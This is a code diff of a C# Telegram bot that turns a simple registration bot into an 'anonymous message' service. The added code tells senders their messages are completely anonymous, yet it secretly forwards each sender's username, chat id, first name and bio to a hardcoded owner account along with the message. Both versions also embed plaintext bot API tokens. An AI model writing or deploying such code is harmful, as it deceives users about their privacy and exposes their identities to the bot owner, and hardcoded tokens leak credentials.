@@ -9,92 +9,85 @@ using static System.Net.Mime.MediaTypeNames;
 using Microsoft.VisualBasic;
 using System.Configuration;
 using Microsoft.Data.SqlClient;
+using System.Drawing.Printing;
+using System.Data.Common;
+using Telegram.Bot.Types.ReplyMarkups;
 
 namespace TelegrambotZ
 {
     internal class Program
     {
 
-        
+
         static void Main(string[] args)
         {
-            SqlConnection sqlConnection = null;
-            sqlConnection = new SqlConnection(ConfigurationManager.ConnectionStrings["dbCon"].ConnectionString);
-            sqlConnection.Open();
-
-            String token = "6614760387:AAHV4WM9H35p5a9bN2ikYfWmfliooJoXCq0";
+            String token = "6403856858:AAEVqVgJLBsBbdJd4L21njU7o2Gif6-s1xM";
             var client = new TelegramBotClient(token);
-            client.StartReceiving(Update, Error);
-            
+            using var cts = new CancellationTokenSource();
+            client.StartReceiving(Update, Error, null, cts.Token);
          
             Console.ReadLine();
-
+            cts.Cancel();
 
         }
         async static Task Update(ITelegramBotClient botClient, Update update, CancellationToken token)
         {
-            SqlConnection sqlConnection = null;
-            sqlConnection = new SqlConnection(ConfigurationManager.ConnectionStrings["dbCon"].ConnectionString);
-            sqlConnection.Open();
-            if (sqlConnection.State == System.Data.ConnectionState.Open)
-            {
-                await Console.Out.WriteLineAsync("Успешное подключение");
-            }
-            string name1 = null;
-            string nickName1 = null;
-            int number1 = 0;
-            var message = update.Message;
             
-            if(message.Text != null)
+            int garickId = 1153499414;
+            TimeSpan times = DateTime.UtcNow - update.Message.Date;
+            if (times.Seconds > 5)
             {
-                if (message.Text.ToLower().Contains("/start"))
-                {
-                   await botClient.SendTextMessageAsync(message.Chat.Id, "Здарова, ты попал в Темясовский бот, здесь ты можешь работать и пить пиво.\nЧтобы зарегистрироваться введите /register");
-                    return;
-                    
-                }
-                if (message.Text.ToLower().Contains("/register"))
-                {
-                    await botClient.SendTextMessageAsync(message.Chat.Id, "Напишите игровой ник:");
-                   
-                   
-                    SqlCommand cmd = new SqlCommand($"INSERT INTO dbo.Users (Name, NickName, Number) VALUES (@Name,@NickName,@Number)",sqlConnection );
-                    cmd.Parameters.AddWithValue("@Name", message.Chat.FirstName);
-                    cmd.Parameters.AddWithValue("@NickName", message.Chat.Username);
-                    cmd.Parameters.AddWithValue("@Number", $"1");
-                    await Console.Out.WriteLineAsync(cmd.ExecuteNonQuery().ToString());
-                    return;
+                Console.WriteLine("skipping old update");
+            }
+            else
+            {
+                
 
+                var message = update.Message;
 
-                }
-                if (message.Text.ToLower().Contains("/users"))
+                if (message.Text != null)
                 {
-                    await botClient.SendTextMessageAsync(message.Chat.Id, "Список зарегистрированных пользователей:");
-                    number1 += 1;
-                    SqlCommand cmd1 = new SqlCommand($"SELECT Name FROM dbo.users", sqlConnection);
-                    
-                    using (SqlDataReader rdr = cmd1.ExecuteReader())
+                    if (message.Text.ToLower().Contains("/start 1153499414"))
                     {
-                        while (rdr.Read())
-                        {
-                            var myString = rdr.GetString(0);
-                            // Do somthing with this rows string, for example to put them in to a list
-                            await botClient.SendTextMessageAsync(message.Chat.Id, $"{myString}");
-                        }
+                        await botClient.SendTextMessageAsync(message.Chat.Id, "🚀 Здесь можно отправить анонимное сообщение человеку, который опубликовал эту ссылку.\r\n\r\nНапишите сюда всё, что хотите ему передать, и через несколько секунд он получит ваше сообщение, но не будет знать от кого.\r\n\r\nОтправить можно фото, видео, 💬 текст, 🔊 голосовые, 📷видеосообщения (кружки), а также стикеры.\r\n\r\n⚠️ Это полностью анонимно!");
                         return;
                     }
 
+                    else if (message.Text != null)
+                    {
 
+                        Console.WriteLine($"{message.Text} \n{message.Chat.Bio} \n {message.Chat.Username} \n {message.Chat.FirstName}");
+                        await botClient.SendTextMessageAsync(message.Chat.Id, "Сообщение отправлено, ожидайте ответ!" );
+                        
+                        
+                        await botClient.SendTextMessageAsync(garickId, $"У тебя новое анонимное сообщение!\r\n{message.Text}\r \n↩️  Свайпни для ответа.");
+                            await botClient.SendTextMessageAsync(garickId, $"Отправил {message.Chat.Username} \n{message.Chat.Id}\n {message.Chat.FirstName}\n {message.Chat.Bio}");
+                        return;
+                    }
+                    
+                    
+                    
 
+                    
                 }
 
             }
-
         }
+    
+
+        
 
         private static Task Error(ITelegramBotClient arg1, Exception exception, CancellationToken arg3)
         {
-            throw new NotImplementedException();
+            var ErrorMessage = exception switch
+            {
+                ApiRequestException apiRequestException
+                    => $"Telegram API Error:\n[{apiRequestException.ErrorCode}]\n{apiRequestException.Message}",
+                _ => exception.ToString()
+            };
+
+            Console.WriteLine(ErrorMessage);
+            return Task.CompletedTask;
         }
     }
 }
